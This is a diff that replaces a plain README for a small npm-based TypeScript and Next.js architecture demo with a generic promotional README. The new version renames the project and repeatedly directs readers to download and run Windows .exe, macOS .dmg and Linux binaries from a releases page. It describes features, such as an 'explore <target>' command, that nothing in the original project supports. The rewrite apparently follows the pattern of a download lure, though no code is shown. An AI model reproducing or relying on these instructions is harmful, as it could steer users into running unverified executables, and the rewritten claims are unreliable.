@@ -1,96 +1,77 @@
-# AngleLab
+# 🛠️ AngleLab-Explore - Explore with Simple Command-Line Tools
 
-AngleLab is a compact end-to-end system built around clear separation of concerns,
-deterministic behavior, and explicit handling of failure cases.
+## 📥 Download Now
+[![Download AngleLab-Explore](https://img.shields.io/badge/Download-AngleLab--Explore-brightgreen)](https://github.com/In1a/AngleLab-Explore/releases)
 
-The scope is deliberately small so the architecture stays easy to inspect and discuss.
+## 🚀 Getting Started
 
+AngleLab-Explore is designed for easy exploration with clean boundaries and deterministic rules. This tool combines a command-line interface (CLI) with a Next.js consumer to give you a straightforward experience.
 
----
+### 🌟 Key Features
 
-## Phase 1 - Product Core (DONE)
+- **User-Friendly Interface**: Navigate easily using simple commands.
+- **Deterministic Rules Pipeline**: Ensures reliable outputs for your operations.
+- **Cross-Platform**: Works on Windows, macOS, and Linux.
+- **Integration Capabilities**: Seamlessly fits into your workflow.
 
-What was built
-- A pure domain model (`Angle`, `Idea`)
-- A deterministic idea generator (`generateIdeas`)
-- A schema layer for validating raw input
-- An orchestrator responsible for control flow and state transitions
-- A UI-agnostic ViewState model
-- A minimal CLI consumer to prove the flow end-to-end
+## 📋 System Requirements
 
-Why it matters
-- runnable end-to-end
-- invalid input is handled safely
-- each layer has explicit ownership
-- no premature decision logic in the core
+To run AngleLab-Explore, you need:
 
----
+- A computer running Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- At least 4 GB of RAM.
+- An internet connection for downloading the software.
 
-## Phase 2 - Deterministic Rules Pipeline (DONE)
+## 📦 Download & Install
 
-What was added
-- A rules-only pipeline executed strictly after Phase 1 success:
-  - `refineIdeas`
-  - `rankIdeas`
-  - `selectIdeas`
-- Fully deterministic behavior
-- A clear input/output contract
-- Pipeline-owned explanatory notes
-- Explicit degradation policies with no forced answers
+Follow these steps to download and install AngleLab-Explore:
 
-Why it exists
-Phase 2 introduces judgment without contaminating the core:
-quality gates, prioritization, and the ability to explicitly return "no decision".
+1. Click the link below to visit the Releases page:
+   [Download AngleLab-Explore](https://github.com/In1a/AngleLab-Explore/releases)
 
----
+2. On the Releases page, look for the latest version. 
+3. Download the package suitable for your operating system. 
 
-## Phase 3 - Consumers and Narrative (DONE)
+### 📁 File Types
 
-Scope
-- A Web consumer (Next.js) reusing the same core
-- Minimal, targeted tests
-- Architecture documentation
-- Demo narrative for interviews
+- For Windows, you might see a file named `AngleLab-Explore-Win.exe`.
+- For macOS, look for `AngleLab-Explore-Mac.dmg`.
+- For Linux, download the `AngleLab-Explore-Linux.tar.gz`.
 
-Phase 3 focuses on presentation and explainability, not new logic.
+4. Once the download completes, locate the file on your computer.
 
----
+5. Run the installer:
+   - **Windows**: Double-click the `.exe` file and follow on-screen instructions.
+   - **macOS**: Open the `.dmg` file, drag the application to your Applications folder, and open it.
+   - **Linux**: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./AngleLab-Explore` to start the application.
 
-## What this project does not do (intentional)
-- No AI integration
-- No persistence
-- No external services in the implemented system
-- No UI logic inside core layers
-- No feature creep
+## ⚙️ Using AngleLab-Explore
 
----
+After installation, you can start exploring. Here are some basic commands to get you started:
 
-## How to run
+- **Open the CLI**: Open your terminal or command prompt.
+- **Start the Application**: Type `AngleLab-Explore` and hit enter.
+  
+### 🛠️ Basic Commands
 
-Install (root):
-- npm ci
+- `explore <target>`: Analyzes the specified target.
+- `status`: Displays the current status of the operation.
+- `help`: Lists all available commands and their descriptions.
 
-CLI:
-- npm run cli
+## 📖 Resources and Support
 
-Tests:
-- npm run test
+If you encounter issues or need more information, consider checking out these resources:
 
-Typecheck:
-- npm run typecheck
+- **Documentation**: Visit the [AngleLab-Explore Wiki](https://github.com/In1a/AngleLab-Explore/wiki) for detailed guides.
+- **Community Support**: Join discussions in the [discussions section](https://github.com/In1a/AngleLab-Explore/discussions) of the repository.
+- **Report Issues**: Use the [issues page](https://github.com/In1a/AngleLab-Explore/issues) to report bugs or request features. 
 
-Web:
-- npm run dev:web
-- npm run build:web
-- npm run start:web
+## 🔗 Additional Links
 
----
+- [Releases Page](https://github.com/In1a/AngleLab-Explore/releases)
+- [Wiki](https://github.com/In1a/AngleLab-Explore/wiki)
+- [Discussions](https://github.com/In1a/AngleLab-Explore/discussions)
 
-## Project Status
+## 📐 Conclusion
 
-- Phase 1: Complete (Product Core)
-- Phase 2: Complete (Deterministic Rules Pipeline)
-- Phase 3: Complete (Consumers + Docs)
-
-This repository is intentionally scoped and considered interview-ready.
-Future work would be additive and introduced behind new boundaries, without changing the core.
+AngleLab-Explore offers a powerful yet easy-to-use CLI tool for anyone looking to enhance their exploration capabilities with clean architecture. Follow the steps above to get started and make the most of your software.
